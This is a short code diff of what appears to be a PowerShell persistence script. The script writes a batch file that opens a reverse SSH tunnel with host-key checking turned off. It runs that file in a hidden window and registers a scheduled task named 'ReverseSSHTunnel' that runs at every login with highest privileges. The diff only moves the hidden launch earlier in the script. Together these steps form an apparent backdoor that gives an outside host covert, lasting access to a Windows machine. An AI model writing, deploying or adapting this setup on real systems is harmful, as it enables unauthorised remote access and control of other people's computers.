@@ -49,6 +49,9 @@ ssh -o "StrictHostKeyChecking=no" -o "ExitOnForwardFailure=yes" -i "$keyFile" -N
 # Save it as a batch file
 Set-Content -Path $batFilePath -Value $batContent -Encoding ASCII
 
+# Run the reverse tunnel .bat file now
+Start-Process -FilePath "$batFilePath" -WindowStyle Hidden
+
 # Schedule task to run the .bat file at user login with highest privileges
 $taskName = "ReverseSSHTunnel"
 $taskExists = schtasks /query /tn $taskName 2>$null
@@ -64,5 +67,3 @@ if ($LASTEXITCODE -ne 0) {
 
 Write-Host "[!] Success! Check at: $batFilePath."
 
-# Run the reverse tunnel .bat file now
-Start-Process -FilePath "$batFilePath" -WindowStyle Hidden
